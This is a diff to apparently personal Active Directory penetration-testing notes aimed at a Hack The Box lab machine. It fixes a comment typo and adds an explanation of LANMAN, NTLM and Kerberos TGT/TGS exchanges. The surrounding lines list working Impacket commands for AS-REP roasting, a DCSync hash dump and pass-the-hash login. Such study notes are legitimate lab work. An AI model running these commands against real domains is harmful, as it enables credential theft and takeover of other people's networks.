@@ -69,7 +69,7 @@ nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
 ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
 ldapsearch -H ldap://[IP_ADDR] -x -b '' -s base
 windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
-GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Rosting
+GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Roasting
 secretdumps.py htb.local/svc_user@10.10.10.161 -just-dc 	# dcsync attack, dump hashes
 psexec.py htb.local/administrator@10.10.10.161 -hashes [ntlm:hash]	# login with hashes
 
@@ -224,3 +224,29 @@ Foreach($obj in $Result)
 1. Find interesting SPN (Service Principal Name)
 2. Get its SAMaccountname
 3. rubeus.exe
+
+
+
+## Microsoft authentication protocols
+
+1. LANMAN (LAN Manager)&#x20;
+2. NTLM (New Technology LAN Manager) v1, v2
+3. Kerberos
+
+### Kerberos
+
+#### TGT (Ticket Granting Ticket)
+
+As it name suggest, it is a ticket used to request more tickets.
+
+1. When user request for a TGT, the user will need to send their **username & timestamp** encrypted with their **password** to the KDC (Key Distribution Center) service installed in the DC.
+2. The KDC will send back a **TGT** along with a **User Session Key** to the user upon successfully authenticated.
+
+#### TGS (Ticket Granting Service)
+
+It is a ticket used to authenticated and access to specific service.
+
+1. **Username & timestamp** encrypted with the **user session** received earlier along with the **TGT** and the **SPN** of the service are required to be sent to the KDC to request for a TGS.
+2. The KDC will return with a **TGS** and a **Service Session Key.**
+3. To authenticate to the service, user need to send their **Username & Timestamp** and their **TGS** to the service.
+
